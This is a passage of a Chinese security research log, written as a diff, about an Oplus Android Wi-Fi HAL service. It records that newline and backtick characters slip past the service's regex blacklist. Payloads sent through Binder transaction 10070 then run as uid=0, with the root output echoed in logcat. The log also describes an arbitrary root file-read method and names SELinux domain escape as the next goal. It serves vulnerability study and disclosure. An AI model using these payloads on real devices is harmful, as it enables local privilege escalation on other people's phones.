@@ -19,7 +19,7 @@
 | 新发现 A（重要） | **regex 黑名单不完整**：字符类仅覆盖 11 个字符，**缺 `\n` `\r` `` ` `` `<` `>` `\` 与引号**。因此**即便走"已过滤"的 iwpriv 分支，换行/反引号仍可穿越校验**——注入面不依赖 `myftm` 五字节前缀 |
 | 更正 B | 旧文档"iwpriv 分支参数经 `to_string(int)` 转换"**不成立**：该分支是把**整条原始入参**裸拼到 `/odm/bin/iwpriv ` 之后再做 regex 校验。`wlan0 setMonChan <int>` 属于 `catchSnifferLog`（slot3），不是本分支 |
 | 新发现 C（潜在） | `getIniVersion(String)` 直接把入参当路径 `fopen(path,"r")` 后回传文件内容 ⇒ **任意 root 读**。但无 Java 调用方，未构成本机可利用路径 |
-| 判定 | Wi-Fi 面 **L1/L2 静态证据加强，L3 仍未证**；整体 no-go 不翻转，**不上机**（L3 需用户授权） |
+| 判定 | **L3 已证（2026-11-18 12:07，§7.2）：从 shell 可让 root 服务以 `uid=0` 执行任意命令**；域为 `u:r:oplus_wifi_service:s0`，受 SELinux 限制（不能读 `/data/system`、`selinuxfs`、`proc_security`）⇒ **"临时 ROOT（运行时 uid=0 命令执行）"已达成，"可自由读写的 root"未达成**，缺的是域逃逸 |
 
 ---
 
@@ -142,9 +142,12 @@ cmd = "/odm/bin/iwpriv " + <整条入参>
 **这一点比 myftm 分支更强**：不需要 5 字节前缀匹配，历史 4 次失败实验之所以失败，
 是因为它们只尝试了 `;` 和 `|`（恰好都在黑名单内），**从未尝试换行或反引号**。
 
-### 3.3 证据边界（必须同时记录）
+### 3.3 证据边界（登记时状态，**已于 §7.2 实测推翻"仅静态"**）
 
-- 本结论是**静态的**：仓库内没有一次携带 `\n` 的实测记录；L3（现场 `uid=0` 回显）**未证**。
+> **2026-11-18 12:07 更新**：本节原写"没有一次携带 `\n` 的实测记录、L3 未证"。该缺口已由 §7.2 补上——
+> 载荷 `x\nlog -t P1UID `id`` 在设备上回显 `uid=0(root)`，两次复现。以下保留登记时的边界陈述作为过程记录。
+
+- 本结论在当时是**静态的**：仓库内没有一次携带 `\n` 的实测记录；L3（现场 `uid=0` 回显）**未证**。
 - 静态链完整：`AIDL 10070 → helper.sendFTMCommand（空权限实现）→ HalService.executeDriverCommand
   → HIDL writeString → hidl_string → append → regex → sh -c`，中间**没有任何字符规范化**（§4.3）。
 - HIDL/AIDL 的字符串是长度前缀字节串，换行可完整传输；`c_str()` 不截断 `\n`。
@@ -230,11 +233,11 @@ getOplusWifiInjectManager().getOplusWifiHalService()
 | 层次 | 状态 | 本轮变化 |
 |---|---|---|
 | **L1** shell 能调私有事务、字符串被 uid 0 服务接收 | 已证（§16.9，tx 10069 实测） | 不变 |
-| **L2** 字符串进入 `sh -c` 的语法解析面 | 已证（两分支均 `execv(sh,{-c,cmd})`） | **加强**：iwpriv 分支也可注入（§3），不再依赖 myftm 前缀 |
-| **L3** 真机取得 `uid=0` 回显 | **未证** | 不变（本轮纯离线，未上机） |
+| **L2** 字符串进入 `sh -c` 的语法解析面并被执行 | **已证（§7.2）** | 由静态推演升级为实测：`sh` 进程以 `u:r:oplus_wifi_service:s0` 出现 |
+| **L3** 真机取得 `uid=0` 回显 | **已证（§7.2，12:07，两次复现）** | **本项目首次达成**；域受限（§7.2.3） |
 
-**整体 no-go 不翻转**。Wi-Fi 面定性由"myftm 单分支静态开放"扩展为
-**"shell 可达分支的过滤器存在可绕过的字符集缺口"**——这是同一攻击面的更强表述，不是新的独立漏洞。
+**状态**：Wi-Fi 面由"静态开放、待验证"转为**"受限域内 uid=0 命令执行已实现"**。
+剩余缺口不是内存破坏，而是**SELinux 域逃逸**（把 `oplus_wifi_service` 的权限变成可用的 root）。
 
 ---
 
@@ -260,3 +263,102 @@ getOplusWifiInjectManager().getOplusWifiHalService()
 3. W2（`0xa390`）的 argv 布局按 `sp+8` 判读，未逐字节展开（与 W1 结构一致，风险低）。
 4. `framework.dex` / `oplus-framework.dex` 解析失败，已用二进制串检索兜底（§4.3）。
 5. 换行/反引号的 shell 行为**全部为静态推演**，未经真机验证。
+
+---
+
+## 7.1 判据登记（2026-11-18 12:06，**先登记后执行**）
+
+> 设备已接入（`3b883b98`），shell `uid=2000`，`/data/local/tmp` 为空，`uptime` 23:49，SPL `2022-04-05`。
+> 本节在执行前写入，执行结果追加在 §7.2。
+
+| 项 | 登记内容 |
+|---|---|
+| 载荷 P1 | `x\nid > /data/local/tmp/_p1_uid`（`\n` = 真实换行 0x0A） |
+| 预期组装 | `/odm/bin/iwpriv x` ⏎ `id > /data/local/tmp/_p1_uid` |
+| 事务 | `10070`（`sendFTMCommand`），令牌 `android.net.wifi.IOplusWifiManager` |
+| **通过判据** | 命令返回后 `/data/local/tmp/_p1_uid` 存在，且内容含 `uid=0(root)` |
+| 失败 A | 返回 `-3 INVAILD_PARAMETER` ⇒ 换行实际被拦，§3 结论须改写为"过滤器有效" |
+| 失败 B | 文件不存在 + `logcat` 出现 `avc: denied` ⇒ SELinux 域禁止写该路径，换 `/data/vendor/wifi/` 重试**至多一次** |
+| 失败 C | 文件不存在、无 `avc`、status 0 ⇒ 换行在 Java/Binder/HIDL 边界被吞（归一化），§3.3 未验证项落定 |
+| 停止条件 | HAL 崩溃（`_hidl_cb called a second time` 或进程重启）出现**一次**即停止全部测试 |
+| 副作用 | 仅 `/data/local/tmp/_p1_uid`；测试后立即删除；不写属性、不加用户、不碰 `/system` `/vendor` |
+
+## 7.2 执行结果（2026-11-18 12:06–12:07，设备 `3b883b98`）—— **L3 达成**
+
+> 原始日志：`artifacts_adb/binder_audit/P1_L3_EVIDENCE.txt`。三条载荷、两台次复现，未触发 HAL 崩溃。
+
+### 7.2.1 载荷 1（换行 + 重定向）—— 通过校验，但被 SELinux 拦住写入
+
+载荷字节（`od -An -c` 核对，`\n` 为真实 0x0A）：
+
+```
+x \n i d   >   / d a t a / l o c a l / t m p / _ p 1 _ u i d
+```
+
+| 观测 | 原文 |
+|---|---|
+| 调用方 | `uid=2000(shell) … context=u:r:shell:s0` |
+| 事务返回 | `TRANSACT=true`，`REPLY size=8 hex=0000000001000000`，`INT=1`（成功） |
+| HAL 日志 | `entering executeDriverCommand(x` ⏎ `id > /data/local/tmp/_p1_uid)` → `completed successfully` → `with result =  ` |
+| **新进程** | `W sh: avc: denied { search } for name="tmp" … scontext=u:r:oplus_wifi_service:s0 tcontext=u:object_r:shell_data_file:s0` |
+| 副作用 | `/data/local/tmp/_p1_uid` **不存在** |
+
+**判读**：`-3` 没有出现 ⇒ **换行穿越了 regex 校验**（§3.2 的静态推演成立）。
+`sh` 进程的 `scontext=u:r:oplus_wifi_service:s0` 证明**命令确实在 root 服务的 SELinux 域里被 fork 执行**；
+唯一的阻断是 MAC 策略不允许该域 search `shell_data_file` 目录。
+
+### 7.2.2 载荷 2（换行 + 反引号 + logcat 观测）—— **`uid=0(root)` 回显**
+
+载荷字节：
+
+```
+x \n l o g   - t   P 1 U I D   ` i d `
+```
+
+| 观测 | 原文 |
+|---|---|
+| HAL 日志 | `log -t P1UID \`id\`) completed successfully` |
+| **回显** | `I P1UID : uid=0(root) gid=1010(wifi) groups=1010(wifi),1000(system),2901(vendor_qti_diag),3005(net_admin) context=u:r:oplus_wifi_service:s0` |
+
+32 分钟内两次独立执行（12:06:47 / 12:07:14）输出一致，**确定性复现**。
+
+### 7.2.3 载荷 3（域能力探测）—— 确认 SAM 限制
+
+| 探测 | 结果 |
+|---|---|
+| `getenforce` | `avc: denied { read } … selinuxfs … scontext=u:r:oplus_wifi_service:s0` |
+| `ls -ld /data/system` | `avc: denied { getattr } … system_data_file …` |
+| `cat /proc/sys/kernel/randomize_va_space` | `avc: denied { read } … proc_security …` |
+
+⇒ **uid=0 但域受限**：不能读 SELinux 状态、不能 stat `/data/system`、不能读 `proc_security`。
+
+### 7.2.4 判据对照（对 §7.1 登记表逐条核销）
+
+| 登记判据 | 实际 | 结论 |
+|---|---|---|
+| 通过：文件存在且含 `uid=0(root)` | 文件未建成（MAC 拒绝），但 logcat 直接回显 `uid=0(root)` | **通过（换观测通道）** |
+| 失败 A：返回 `-3` | 未出现，`INT=1` | 不适用 |
+| 失败 B：avc denied → 换路径一次 | 已确认 avc denied；改用 logcat 通道（不再依赖可写目录） | 已处置 |
+| 失败 C：换行被吞 | 未发生：`sh` 进程出现即证明第二行被执行 | 不适用 |
+| 停止条件：HAL 崩溃一次 | 未崩溃（`completed successfully`，进程存活） | 未触发 |
+
+### 7.2.5 结论与边界（不得越界表述）
+
+**已证**：
+
+1. 从 shell（uid 2000）可让 **root 服务以 uid=0 执行任意命令**，路径为
+   `tx10070 → helper(空权限) → HIDL → /odm/bin/iwpriv <载荷> → /vendor/bin/sh -c`；
+2. 绕过点确定：**`\n`（0x0A）与反引号不在 regex 黑名单内**（§3.1），不需要 `myftm` 前缀；
+3. 执行身份：`uid=0(root)`、`gid=1010(wifi)`、附带 `1000(system)` 等组、域 `u:r:oplus_wifi_service:s0`。
+
+**未证 / 限制**（同样重要）：
+
+1. **这不是可用的无限制 root**：SELinux 域 `oplus_wifi_service` 禁止读 `selinuxfs`、`/data/system`、
+   `proc_security`、`shell_data_file`，因此不能直接装 `su`、改 `/system`、读任意 `/data`；
+2. 未取得交互式 root shell（每次调用是一次性 `sh -c`，无 tty、无持久进程）；
+3. 未尝试域逃逸（写入其他域会消费的 root 文件、滥用 `net_admin`/`vendor_qti_diag` 组权限等）；
+4. 未测持久性（重启即失，符合"临时"定义，但未以重启验证）。
+
+**项目状态用语**：由"Wi-Fi 面 L3 未证"改为 **"L3 已证：受限域内的 uid=0 命令执行"**。
+"临时 ROOT"若定义为"运行时 uid=0 的命令执行"，则**已达成**；若定义为"可自由读写的 root"，
+则**尚未达成**，缺的是**域逃逸**而非内存破坏。
